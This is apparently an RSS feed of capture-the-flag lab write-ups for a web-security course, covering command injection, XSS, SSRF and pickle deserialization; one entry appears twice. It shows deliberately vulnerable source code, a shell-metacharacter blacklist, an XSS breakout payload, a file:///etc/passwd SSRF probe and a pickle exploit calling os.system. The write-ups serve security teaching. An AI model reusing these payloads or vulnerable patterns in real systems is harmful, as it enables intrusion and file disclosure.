&lt;/ol></description></item><item><title>Simple Web 0x09(Lab - DNS Lookup Tool)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x09lab---dns-lookup-tool/</guid><description>&lt;h1 id="simple-web-0x09lab---dns-lookup-tool">
 Simple Web 0x09(Lab - DNS Lookup Tool)
 &lt;a class="anchor" href="#simple-web-0x09lab---dns-lookup-tool">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8300/">http://h4ck3r.quest:8300/&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;

&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
 &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
 &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;DNS Lookup Tool | Baby&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
 &amp;lt;section class=&amp;#34;section&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;column is-6 is-offset-3 has-text-centered&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;box&amp;#34;&amp;gt;
 &amp;lt;h1 class=&amp;#34;title&amp;#34;&amp;gt;DNS Lookup Tool 🔍&amp;lt;/h1&amp;gt;
 &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;field&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;control&amp;#34;&amp;gt;
 &amp;lt;input class=&amp;#34;input&amp;#34; type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;example.com&amp;#34; id=&amp;#34;hostname&amp;#34; value=&amp;#34;&amp;lt;?= $_POST[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39; ?&amp;gt;&amp;#34;&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;button class=&amp;#34;button is-block is-info is-fullwidth&amp;#34;&amp;gt;
 Lookup!
 &amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;br&amp;gt;
 &amp;lt;?php if (isset($_POST[&amp;#39;name&amp;#39;])) : ?&amp;gt;
 &amp;lt;section class=&amp;#34;has-text-left&amp;#34;&amp;gt;
 &amp;lt;p&amp;gt;Lookup result:&amp;lt;/p&amp;gt;
 &amp;lt;pre&amp;gt;&amp;lt;?= shell_exec(&amp;#34;host &amp;#39;&amp;#34; . $_POST[&amp;#39;name&amp;#39;] . &amp;#34;&amp;#39;;&amp;#34;) ?&amp;gt;&amp;lt;/pre&amp;gt;
 &amp;lt;/section&amp;gt;
 &amp;lt;?php endif; ?&amp;gt;
 &amp;lt;hr&amp;gt;
 &amp;lt;a id=&amp;#34;magic&amp;#34;&amp;gt;Magic&amp;lt;/a&amp;gt; | &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;article class=&amp;#34;message is-link is-hidden is-size-4&amp;#34; id=&amp;#34;hint&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;message-body is-family-monospace&amp;#34;&amp;gt;
 host &amp;#39;&amp;lt;span class=&amp;#34;has-text-danger&amp;#34; id=&amp;#34;command&amp;#34;&amp;gt;&amp;lt;/span&amp;gt;&amp;#39;;
 &amp;lt;/div&amp;gt;
 &amp;lt;/article&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/section&amp;gt;

 &amp;lt;script&amp;gt;
 magic.onclick = () =&amp;gt; hint.classList.toggle(&amp;#34;is-hidden&amp;#34;);
 window.onload = hostname.oninput = () =&amp;gt; command.textContent = hostname.value;
 &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt; 
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x10(Lab - DNS Lookup Tool | WAF)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/command-injection/simple-web-0x10lab---dns-lookup-tool-_-waf/</guid><description>&lt;h1 id="simple-web-0x10lab---dns-lookup-tool--waf">
 Simple Web 0x10(Lab - DNS Lookup Tool | WAF)
 &lt;a class="anchor" href="#simple-web-0x10lab---dns-lookup-tool--waf">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/7b8uMzpCfug?t=3612">2022/03/30 網頁安全&lt;/a>
&lt;a href="https://lab.feifei.tw/practice/ci/l1.php">Command injection&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php="> &amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) and die(show_source(__FILE__, true));
?&amp;gt;

&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;

&amp;lt;head&amp;gt;
 &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;
 &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;
 &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;
 &amp;lt;title&amp;gt;DNS Lookup Tool | WAF&amp;lt;/title&amp;gt;
 &amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/bulma@0.9.3/css/bulma.min.css&amp;#34;&amp;gt;
&amp;lt;/head&amp;gt;

&amp;lt;body&amp;gt;
 &amp;lt;section class=&amp;#34;section&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;container&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;column is-6 is-offset-3 has-text-centered&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;box&amp;#34;&amp;gt;
 &amp;lt;h1 class=&amp;#34;title&amp;#34;&amp;gt;DNS Lookup Tool 🔍 | WAF Edition&amp;lt;/h1&amp;gt;
 &amp;lt;form method=&amp;#34;POST&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;field&amp;#34;&amp;gt;
 &amp;lt;div class=&amp;#34;control&amp;#34;&amp;gt;
 &amp;lt;input class=&amp;#34;input&amp;#34; type=&amp;#34;text&amp;#34; name=&amp;#34;name&amp;#34; placeholder=&amp;#34;example.com&amp;#34; id=&amp;#34;hostname&amp;#34; value=&amp;#34;&amp;lt;?= $_POST[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39; ?&amp;gt;&amp;#34;&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;button class=&amp;#34;button is-block is-info is-fullwidth&amp;#34;&amp;gt;
 Lookup!
 &amp;lt;/button&amp;gt;
 &amp;lt;/form&amp;gt;
 &amp;lt;br&amp;gt;
 &amp;lt;?php if (isset($_POST[&amp;#39;name&amp;#39;])) : ?&amp;gt;
 &amp;lt;section class=&amp;#34;has-text-left&amp;#34;&amp;gt;
 &amp;lt;p&amp;gt;Lookup result:&amp;lt;/p&amp;gt;
 &amp;lt;pre&amp;gt;
 &amp;lt;?php
 $blacklist = [&amp;#39;|&amp;#39;, &amp;#39;&amp;amp;&amp;#39;, &amp;#39;;&amp;#39;, &amp;#39;&amp;gt;&amp;#39;, &amp;#39;&amp;lt;&amp;#39;, &amp;#34;\n&amp;#34;, &amp;#39;flag&amp;#39;];
 $is_input_safe = true;
 foreach ($blacklist as $bad_word)
 if (strstr($_POST[&amp;#39;name&amp;#39;], $bad_word) !== false) $is_input_safe = false;

 if ($is_input_safe)
 system(&amp;#34;host &amp;#39;&amp;#34; . $_POST[&amp;#39;name&amp;#39;] . &amp;#34;&amp;#39;;&amp;#34;);
 else
 echo &amp;#34;HACKER!!!&amp;#34;;
 ?&amp;gt;
 &amp;lt;/pre&amp;gt;
 &amp;lt;/section&amp;gt;
 &amp;lt;?php endif; ?&amp;gt;
 &amp;lt;hr&amp;gt;
 &amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/div&amp;gt;
 &amp;lt;/section&amp;gt;
&amp;lt;/body&amp;gt;

&amp;lt;/html&amp;gt; 
&lt;/code>&lt;/pre>&lt;p>:::
It set some protection such as blacklist.&lt;/p></description></item><item><title>Simple Web 0x11(Lab - XSS Me)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</guid><description>&lt;h1 id="simple-web-0x11lab---xss-me">
 Simple Web 0x11(Lab - XSS Me)
 &lt;a class="anchor" href="#simple-web-0x11lab---xss-me">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8800/">http://h4ck3r.quest:8800/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler
攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取&lt;code>COOKIE&lt;/code>之類的)
&lt;img src="https://i.imgur.com/lZ0bj41.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/grJXpr7.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/q9fwa6z.png" alt="" />
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;User not found.&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
 window.onload = function () {
 if (message !== null) Swal.fire(message);
 }
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Check XSS
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;youshallnotpass&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
 window.onload = function () {
 if (message !== null) Swal.fire(message);
 }
&amp;lt;/script&amp;gt;
...
&lt;/code>&lt;/pre>&lt;img src="https://i.imgur.com/OffMAUF.png" alt="" />&lt;/li>
&lt;li>Try to inject script tag
Payload: &lt;code>http://h4ck3r.quest:8800/?type=error&amp;amp;message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E//&lt;/code>
&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
&amp;lt;script&amp;gt;
 const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;//&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
 window.onload = function () {
 if (message !== null) Swal.fire(message);
 }
&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;img src="https://i.imgur.com/1cZJvIv.png" alt="" />&lt;/li>
&lt;/ol>
&lt;ul>
&lt;li>Hint
If you login as guest(password = guest), then you can get the response
&lt;img src="https://i.imgur.com/s2R75Xf.png" alt="" />&lt;/li>
&lt;/ul>
&lt;ol start="3">
&lt;li>
&lt;p>Fetch flag and send to &lt;a href="https://beeceptor.com/">beeceptor&lt;/a>
Payload:&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x15lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
 Simple Web 0x12(Lab - Web Preview Card)
 &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8500/">http://h4ck3r.quest:8500/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
&lt;h2 id="exploit---ssrf">
 Exploit - SSRF
 &lt;a class="anchor" href="#exploit---ssrf">#&lt;/a>
&lt;/h2>
&lt;p>When you see a preview function, then it may have SSRF problem.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Test it
&lt;code>file:///etc/passwd&lt;/code> or &lt;code>http://127.0.0.1&lt;/code>
&lt;img src="https://i.imgur.com/NKbIlDT.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Analyze &lt;code>flag.php&lt;/code>
&lt;img src="https://i.imgur.com/OGo7biu.png" alt="" />
:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die(&amp;#34;Only for localhost user.&amp;#34;);
?&amp;gt;
&amp;lt;form action=&amp;#34;/flag.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
 Do you want the FLAG? &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;givemeflag&amp;#34; value=&amp;#34;no&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;?php
if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
 echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
&lt;/code>&lt;/pre>&lt;p>:::
If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x12(Lab - Web Preview Card)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x12lab---web-preview-card/</guid><description>&lt;h1 id="simple-web-0x12lab---web-preview-card">
 Simple Web 0x12(Lab - Web Preview Card)
 &lt;a class="anchor" href="#simple-web-0x12lab---web-preview-card">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8500/">http://h4ck3r.quest:8500/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://youtu.be/hWC-Evt-sBc?t=6136">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
&lt;h2 id="exploit---ssrf">
 Exploit - SSRF
 &lt;a class="anchor" href="#exploit---ssrf">#&lt;/a>
&lt;/h2>
&lt;p>When you see a preview function, then it may have SSRF problem.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Test it
&lt;code>file:///etc/passwd&lt;/code> or &lt;code>http://127.0.0.1&lt;/code>
&lt;img src="https://i.imgur.com/NKbIlDT.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Analyze &lt;code>flag.php&lt;/code>
&lt;img src="https://i.imgur.com/OGo7biu.png" alt="" />
:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
if ($_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;] !== &amp;#39;127.0.0.1&amp;#39;) die(&amp;#34;Only for localhost user.&amp;#34;);
?&amp;gt;
&amp;lt;form action=&amp;#34;/flag.php&amp;#34; method=&amp;#34;post&amp;#34;&amp;gt;
 Do you want the FLAG? &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;givemeflag&amp;#34; value=&amp;#34;no&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;?php
if (isset($_POST[&amp;#39;givemeflag&amp;#39;]) &amp;amp;&amp;amp; $_POST[&amp;#39;givemeflag&amp;#39;] === &amp;#39;yes&amp;#39;)
 echo &amp;#34;FLAG:&amp;#34;, getenv(&amp;#39;FLAG&amp;#39;);
&lt;/code>&lt;/pre>&lt;p>:::
If you want flag, you need visit &lt;code>/flag.php&lt;/code> as localhost and send a form data with parameter &lt;code>givemeflag&lt;/code>.&lt;/p></description></item><item><title>Simple Web 0x13(Lab - SSRFrog)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x13lab---ssrfrog/</guid><description>&lt;h1 id="simple-web-0x13lab---ssrfrog">
 Simple Web 0x13(Lab - SSRFrog)
 &lt;a class="anchor" href="#simple-web-0x13lab---ssrfrog">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8501/">http://h4ck3r.quest:8501/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://pjchender.dev/javascript/js-set/">javascript Set()&lt;/a>
&lt;a href="https://youtu.be/hWC-Evt-sBc?t=9867">Web Hacking | 續章【EDU-CTF 2021】&lt;/a>
&lt;a href="https://medium.com/%e7%a8%8b%e5%bc%8f%e7%8c%bf%e5%90%83%e9%a6%99%e8%95%89/%e7%b6%b2%e7%ab%99%e5%ae%89%e5%85%a8-%e4%bc%ba%e6%9c%8d%e5%99%a8%e8%ab%8b%e6%b1%82%e5%81%bd%e9%80%a0-ssrf-%e6%94%bb%e6%93%8a-%e9%a0%85%e8%8e%8a%e8%88%9e%e5%8a%8d-%e6%84%8f%e5%9c%a8%e6%b2%9b%e5%85%ac-7a5524926362">網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#34;express&amp;#34;);
const http = require(&amp;#34;http&amp;#34;);

const app = express();

app.get(&amp;#34;/source&amp;#34;, (req, res) =&amp;gt; {
 return res.sendFile(__filename);
})
app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; {
 const { url } = req.query;
 if (!url || typeof url !== &amp;#39;string&amp;#39;) return res.sendFile(__dirname + &amp;#34;/index.html&amp;#34;);

 // no duplicate characters in `url`
 if (url.length !== new Set(url).size) return res.sendFile(__dirname + &amp;#34;/frog.png&amp;#34;);

 try {
 http.get(url, resp =&amp;gt; {
 resp.setEncoding(&amp;#34;utf-8&amp;#34;);
 resp.statusCode === 200 ? resp.on(&amp;#39;data&amp;#39;, data =&amp;gt; res.send(data)) : res.send(&amp;#34;:(&amp;#34;);
 }).on(&amp;#39;error&amp;#39;, () =&amp;gt; res.send(&amp;#34;WTF?&amp;#34;));
 } catch (error) {
 res.send(&amp;#34;WTF?&amp;#34;);
 }
});

app.listen(3000, &amp;#39;0.0.0.0&amp;#39;);
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x14(Lab - Debug)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssrf/simple-web-0x14lab---debug/</guid><description>&lt;h1 id="simple-web-0x14lab---debug">
 Simple Web 0x14(Lab - Debug)
 &lt;a class="anchor" href="#simple-web-0x14lab---debug">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:9020/">http://h4ck3r.quest:9020/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from flask import Flask, request, Response
import urllib.request
import json

app = Flask(__name__)

app.config[&amp;#39;FLAG&amp;#39;] = &amp;#34;FL4G{fake_flag}&amp;#34;

@app.route(&amp;#39;/&amp;#39;)
def index():
 return &amp;#39;&amp;#39;&amp;#39;
&amp;lt;form action=&amp;#34;/proxy&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;url&amp;#34; placeholder=&amp;#34;URL&amp;#34;&amp;gt;
 &amp;lt;input type=&amp;#34;submit&amp;#34;&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;/source&amp;#34;&amp;gt;Source Code&amp;lt;/a&amp;gt; | &amp;lt;a href=&amp;#34;/debug&amp;#34;&amp;gt;Debug&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
&amp;#39;&amp;#39;&amp;#39;

@app.route(&amp;#34;/proxy&amp;#34;)
def proxy():
 url = request.args.get(&amp;#34;url&amp;#34;)
 if url is None:
 return &amp;#34;No URL provided&amp;#34;
 if &amp;#34;https://&amp;#34; not in url:
 url = &amp;#34;https://&amp;#34; + url
 try:
 with urllib.request.urlopen(url) as response:
 return response.read()
 except urllib.error.HTTPError as e:
 return str(e)

@app.route(&amp;#34;/debug&amp;#34;)
def debug():
 # only allow access for localhost
 if request.remote_addr != &amp;#34;127.0.0.1&amp;#34;:
 return &amp;#34;Access denied&amp;#34;, 403
 return json.dumps(app.config, default=lambda _: None)

@app.route(&amp;#34;/source&amp;#34;)
def source():
 import re
 source_code = open(__file__).read()
 source_code = re.sub(r&amp;#39;FLAG{.*}&amp;#39;, r&amp;#39;FL4G{fake_flag}&amp;#39;, source_code, count=1)
 return Response(source_code, mimetype=&amp;#39;text/plain&amp;#39;)
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x15.5(Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x15.5pickle/</guid><description>&lt;h1 id="simple-web-0x155pickle">
 Simple Web 0x15.5(Pickle)
 &lt;a class="anchor" href="#simple-web-0x155pickle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;h2 id="background---pickle">
 Background - Pickle
 &lt;a class="anchor" href="#background---pickle">#&lt;/a>
&lt;/h2>
&lt;p>Python magic method: &lt;code>__reduce__&lt;/code>
&lt;code>__recude__&lt;/code> is used to define what needs to be done when deserializing.
&lt;a href="https://youtu.be/73uI7BK8k3g?t=236">Web Hacking | 終章【EDU-CTF 2021】&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler &lt;code>exploit.py&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python!=" data-lang="python!=">import pickle
import os
import pickletools

class exploit(object):
 def __reduce__(self):
 return (os.system, (&amp;#39;pwd&amp;#39;,))
 

serialized = pickle.dumps(exploit())
print(bytes.hex(serialized))
optim_s = pickletools.optimize(serialized)
print(pickletools.dis(serialized))
print(pickletools.dis(optim_s))
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;hr>
